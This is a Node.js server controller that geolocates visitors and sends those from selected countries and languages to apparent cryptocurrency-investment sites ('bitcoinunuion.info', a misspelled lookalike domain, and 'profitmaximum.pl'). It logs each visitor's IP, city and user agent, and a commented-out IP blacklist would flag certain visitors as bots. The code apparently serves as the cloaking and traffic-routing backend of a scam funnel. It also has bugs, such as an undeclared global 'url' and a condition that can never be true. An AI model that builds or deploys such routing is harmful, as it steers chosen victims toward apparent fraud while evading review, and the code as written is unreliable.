const geoip = require('geoip-lite');
const ip6addr = require('ip6addr');
const Address6 = require('ip-address').Address6;
const Ip = require('../models/IpAddress');
const User = require('../models/User');
const errorHandler = require('../utils/errorHandler');

module.exports.getUrl = async function (req, res) {
    try {
        let ip = req.ip
        // let ip = '185.41.250.246'
        if (ip6addr.parse(ip).kind() === 'ipv6') {
            ip = new Address6(ip).inspectTeredo().server4;
        }

        if (ip.substr(0, 7) === "::ffff:") {
            ip = ip.substr(7)
        }

        let data = checkCountry(ip, req.body.language);

        let unique;
        const uniqueUser = await User.findOne({ip})
        if (uniqueUser) {
            unique = 0
        } else {
            unique = 1
        }

        // const allBlackIp = await Ip.find({})
        // const block = parceIpForCompare(ip, allBlackIp);

        let date = new Date(Date.now()).getFullYear() + '-' +
            ("0" + (new Date(Date.now()).getMonth() + 1)).slice(-2) + '-' +
            ("0" + (new Date(Date.now()).getDate())).slice(-2) + ' ' +
            ("0" + new Date(Date.now()).getHours()).slice(-2) + ':' +
            ("0" + new Date(Date.now()).getMinutes()).slice(-2) + ':' +
            ("0" + new Date(Date.now()).getSeconds()).slice(-2);

        // if (block) {
        //     const user = new User({
        //         UserAgent: req.body.UserAgent,
        //         UTM: req.body.UTM,
        //         reason: 'This ip is in black list!',
        //         language: req.body.language.toUpperCase(),
        //         url: null,
        //         ip,
        //         country: data.countryCode,
        //         city: data.city,
        //         bot: 1,
        //         unique,
        //         date: date
        //     });
        //     await user.save()
        //     res.status(200).json({status: false})
        // } else {
            let reason = null
            if (data.url === null) {
                if (data.reason.length < 0) {
                    reason = 'Invalid country'
                } else {
                    reason = data.reason
                }
                res.status(200).json({status: false})
            } else {
                if (url === 'profitmaximum.pl/') url = url + '?' + req.body.UTM
                res.status(200).json({
                    status: true,
                    url
                })
            }
            const user = new User({
                UserAgent: req.body.UserAgent,
                UTM: req.body.UTM,
                reason: reason,
                language: req.body.language.toUpperCase(),
                url: data.url,
                responseUrl: url,
                ip,
                country: data.countryCode,
                city: data.city,
                bot: 0,
                unique,
                date: date
            });
            await user.save()
        // }

    } catch (e) {
        errorHandler(res, e)
    }
}

function checkCountry(ip, language) {
    let geo = geoip.lookup(ip);
    let countryCode;
    let city;
    let reason = '';
    if (geo === null) {
        url = null;
        countryCode = null;
        city = null;
    } else {
        countryCode = geo.country;
        city = geo.city;

        if (countryCode === "CN" ||
            countryCode === "SG" || countryCode === "AU" ||
            countryCode === "UK" || countryCode === "HK") {
            url = 'bitcoinunuion.info'
        } else if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
            if (language.toUpperCase() ==='RU' ||
                language.toUpperCase() ==='UA' ||
                language.toUpperCase() ==='RU-UA' ||
                language.toUpperCase() ==='EN-UA' ||
                language.toUpperCase() ==='EN-RU' ||
                language.toUpperCase() ==='EN-PL' ||
                language.toUpperCase() ==='PL') {
                url = 'profitmaximum.pl/'
            } else {
                reason = 'Invalid language'
                url = null
            }
        } else {
            url = null;
            reason = 'Invalid country'
        }

    }

    return {url, countryCode, city, reason}
}

// function parceIpForCompare(ip, allBlackIp) {
//     let newIp = ip.split('.').map(item => {
//         if ((item.length < 1)) return item = '000'
//         if (item.length === 1) return item = '00' + item
//         if (item.length === 2) return item = '0' + item
//         if (item.length === 3 || item.length > 3) return item
//     })
//     return compareIp(newIp.join(''), allBlackIp)
// }
//
// function compareIp(ip, allBlackIp) {
//     let block = false;
//     allBlackIp.map(item => {
//         if (item.firstDiapason <= ip && item.secondDiapason >= ip &&
//             item.firstDiapason !== '000000000000' &&
//             item.secondDiapason !== '255255255255') {
//             block = true
//         }
//     })
//     // return block
//     return false
// }
